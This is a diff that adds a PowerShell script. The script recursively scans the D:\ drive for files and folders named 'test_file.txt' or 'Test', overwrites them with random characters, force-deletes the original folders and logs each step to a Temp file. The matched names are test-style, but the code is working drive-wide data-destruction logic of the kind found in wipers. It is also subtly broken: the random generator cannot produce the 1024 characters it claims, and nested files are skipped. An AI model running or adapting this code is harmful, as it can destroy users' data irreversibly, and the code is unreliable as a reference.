@@ -1,0 +1,84 @@
+# Function to generate a random string of garbage data
+function Generate-GarbageData {
+    param (
+        [int]$Size
+    )
+    $characters = -join ((65..90) + (97..122) + (48..57)) # A-Z, a-z, 0-9
+    $randomString = -join (Get-Random -Count $Size -InputObject $characters.ToCharArray())
+    return $randomString
+}
+
+# Function to replace the content of a file with garbage data
+function Replace-WithGarbageData {
+    param (
+        [string]$FilePath
+    )
+    $garbageData = Generate-GarbageData -Size 1024
+    Set-Content -Path $FilePath -Value $garbageData
+    Log-Action "Replaced content of file: $FilePath"
+}
+
+# Function to log actions to a separate file with timestamps
+function Log-Action {
+    param (
+        [string]$Message
+    )
+    # Set log file path to AppData\Local\Temp for the current user
+    $logPath = "$env:USERPROFILE\AppData\Local\Temp\log.txt"
+    
+    # Create a timestamped log entry
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "$timestamp - $Message"
+    
+    # Append the log entry to the log file
+    Add-Content -Path $logPath -Value $logMessage
+}
+
+# Function to scan the directory and perform actions on matched files or folders
+function Scan-Directory {
+    param (
+        [string]$RootDir,
+        [string[]]$TargetNames
+    )
+
+    Get-ChildItem -Path $RootDir -Recurse | ForEach-Object {
+        $fileOrDir = $_.FullName
+        if ($TargetNames -contains $_.Name) {
+            if ($_.PSIsContainer) {
+                # Copy folder to a temporary location and log action
+                $tempFolderPath = "$fileOrDir-temp"
+                Copy-Item -Path $fileOrDir -Destination $tempFolderPath -Recurse
+                Log-Action "Copied folder: $fileOrDir to $tempFolderPath"
+
+                # Replace content of all files inside the folder
+                Get-ChildItem -Path $tempFolderPath | ForEach-Object {
+                    Replace-WithGarbageData -FilePath $_.FullName
+                }
+
+                # Delay to ensure no locks
+                Start-Sleep -Seconds 1 
+
+                # Remove the original folder and log action
+                Remove-Item -Path $fileOrDir -Recurse -Force
+                Log-Action "Deleted original folder: $fileOrDir"
+
+                # Rename temp folder back to the original name
+                Rename-Item -Path $tempFolderPath -NewName (Split-Path $fileOrDir -Leaf)
+                Log-Action "Renamed temp folder back to original: $fileOrDir"
+            } else {
+                # Replace file content with garbage and log action
+                Replace-WithGarbageData -FilePath $fileOrDir
+                Log-Action "Replaced file: $fileOrDir"
+            }
+        }
+    }
+}
+
+# Specify the root directory to scan and the target file and folder names
+$rootDirectory = 'D:\'
+$targetFileAndFolderNames = @('test_file.txt', 'Test_file.txt', 'Test')
+
+# Start the directory scanning process and log
+Log-Action "Started scanning directory: $rootDirectory"
+Scan-Directory -RootDir $rootDirectory -TargetNames $targetFileAndFolderNames
+Log-Action "Completed scanning directory: $rootDirectory"
